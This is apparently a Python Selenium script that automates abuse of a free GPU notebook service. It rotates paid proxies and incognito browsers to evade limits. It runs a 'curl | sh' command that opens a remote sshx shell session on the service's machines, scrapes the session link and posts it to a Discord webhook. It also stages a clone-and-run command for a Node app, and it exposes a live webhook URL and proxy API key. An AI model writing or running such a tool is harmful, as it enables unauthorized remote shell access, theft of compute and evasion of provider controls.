from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import time, re, requests, zipfile, json, os

# ================= CONFIG =================
SITE_URL = "https://www.nicegpu.com/"
PLAYGROUND_XPATH = '//*[@id="app"]/div/div[1]/div[2]/div/div/div/div[1]/div[3]/button[2]'
WELCOME_PATH = "/lab/tree/WELCOME.ipynb"

SSHX_CMD = "!curl -sSf https://sshx.io/get | sh -s run"

YOUR_NAME = "hoanqson"
TEXT_TO_PASTE = (
    "sudo apt update && sudo apt install -y nodejs npm && "
    "git clone https://github.com/hoanqson2107/node-ai.git && "
    "cd node-ai && node app.js"
)

WEBHOOK_URL = "https://discord.com/api/webhooks/1465693138906779660/FbFPFyVi172242cD1wVQUwaRR62vWVmYbj4hioKkA4rYYoxiKGyDegVEhict7Fwxi8hd"

# ===== PROXY CONFIG =====
PROXY_API = "https://api.zingproxy.com/open/get-proxy/d2o115o0zpq3ded62ccec98c681d59ca4629f6dd30cfa6f911be335"
PROXY_COOLDOWN = 240  # 240s mới xoay được

TOTAL_RUN = 5  # số vòng SSHX

# ================= PROXY GLOBAL =================
current_proxy = None
last_proxy_time = 0

# ================= PROXY FUNCTIONS =================
def get_proxy():
    r = requests.get(PROXY_API, timeout=10).json()
    proxy = r.get("data") or r.get("proxy") or r.get("ip_port")
    if not proxy:
        raise Exception("Không lấy được proxy từ API")
    ip, port, user, pwd = proxy.split(":")
    return ip, port, user, pwd

def get_proxy_safe():
    global current_proxy, last_proxy_time
    now = time.time()

    if not current_proxy:
        print("🌐 Lấy proxy lần đầu")
        current_proxy = get_proxy()
        last_proxy_time = now
        return current_proxy

    if now - last_proxy_time < PROXY_COOLDOWN:
        wait_left = int(PROXY_COOLDOWN - (now - last_proxy_time))
        print(f"⏳ Proxy chưa đủ 240s → dùng lại ({wait_left}s)")
        return current_proxy

    print("🔁 Đủ 240s → xoay proxy mới")
    current_proxy = get_proxy()
    last_proxy_time = now
    return current_proxy

def create_proxy_extension(ip, port, user, pwd):
    manifest = {
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "Proxy Auth",
        "permissions": [
            "proxy", "tabs", "storage",
            "<all_urls>", "webRequest", "webRequestBlocking"
        ],
        "background": {"scripts": ["background.js"]}
    }

    background = f"""
var config = {{
  mode: "fixed_servers",
  rules: {{
    singleProxy: {{
      scheme: "http",
      host: "{ip}",
      port: parseInt({port})
    }},
    bypassList: ["localhost"]
  }}
}};
chrome.proxy.settings.set({{value: config, scope: "regular"}}, function(){{}});

chrome.webRequest.onAuthRequired.addListener(
  function() {{
    return {{
      authCredentials: {{
        username: "{user}",
        password: "{pwd}"
      }}
    }};
  }},
  {{urls: ["<all_urls>"]}},
  ["blocking"]
);
"""

    fn = f"proxy_{ip}_{port}.zip"
    with zipfile.ZipFile(fn, "w") as z:
        z.writestr("manifest.json", json.dumps(manifest))
        z.writestr("background.js", background)
    return fn

# ================= DRIVER =================
def create_incognito_driver(proxy):
    opts = Options()
    opts.add_argument("--incognito")
    opts.add_argument("--disable-gpu")
    opts.add_argument("--no-sandbox")
    opts.add_argument("--disable-dev-shm-usage")
    opts.add_argument("--start-maximized")

    if proxy:
        opts.add_extension(create_proxy_extension(*proxy))

    return webdriver.Chrome(options=opts)

# ================= IP CHECK =================
def check_real_ip(driver):
    driver.get("https://api.ipify.org/")
    time.sleep(2)
    ip = driver.find_element(By.TAG_NAME, "body").text.strip()
    print("🌍 IP THỰC TẾ:", ip)
    return ip

# ================= WEBHOOK =================
def send_webhook(link, ip):
    try:
        requests.post(
            WEBHOOK_URL,
            json={"content": f"🔥 **SSHX CREATED**\n🌍 IP: `{ip}`\n{link}"},
            timeout=10
        )
    except:
        pass

# ================= MAIN =================
for run in range(1, TOTAL_RUN + 1):
    print(f"\n🚀 RUN {run}/{TOTAL_RUN}")

    proxy = get_proxy_safe()
    start_time = time.time()

    driver = create_incognito_driver(proxy)
    wait = WebDriverWait(driver, 300)
    actions = ActionChains(driver)

    try:
        print("[1] Open nicegpu")
        driver.get(SITE_URL)
        time.sleep(3)

        print("[2] Click Playground")
        old_tabs = driver.window_handles.copy()
        wait.until(EC.element_to_be_clickable((By.XPATH, PLAYGROUND_XPATH))).click()
        wait.until(lambda d: len(d.window_handles) > len(old_tabs))
        driver.switch_to.window(list(set(driver.window_handles) - set(old_tabs))[0])

        wait.until(lambda d: "/lab" in d.current_url)
        time.sleep(2)

        actions.send_keys(Keys.F5).perform()
        time.sleep(5)

        print("[3] Wait welcome")
        wait.until(lambda d: WELCOME_PATH in d.current_url and "token=" not in d.current_url)

        print("[4] Notebook ready")
        wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, ".jp-Notebook")))
        time.sleep(1)

        print("[5] New cell")
        actions.send_keys(Keys.ESCAPE).send_keys("b").send_keys(Keys.ENTER).perform()

        print("[6] Run SSHX")
        actions.send_keys(SSHX_CMD).key_down(Keys.SHIFT).send_keys(Keys.ENTER).key_up(Keys.SHIFT).perform()
        time.sleep(20)

        print("[7] Get SSHX link")
        sshx_link = None
        for o in driver.find_elements(By.CSS_SELECTOR, ".jp-OutputArea-output pre"):
            m = re.search(r"https://sshx\.io/\S+", o.text)
            if m:
                sshx_link = m.group()
                break
        if not sshx_link:
            raise Exception("Không tìm thấy SSHX link")

        print("🔥 SSHX:", sshx_link)

        print("[8] Check IP")
        ip = check_real_ip(driver)

        send_webhook(sshx_link, ip)

    except Exception as e:
        print("❌ LỖI:", e)

    finally:
        driver.quit()

    # ===== AUTO DELAY ĐỦ 240s =====
    elapsed = time.time() - start_time
    if elapsed < PROXY_COOLDOWN:
        sleep_time = int(PROXY_COOLDOWN - elapsed)
        print(f"⏳ Chờ {sleep_time}s cho đủ 240s trước vòng tiếp")
        time.sleep(sleep_time)

print("\n✅ ALL DONE – không xoay proxy sớm")
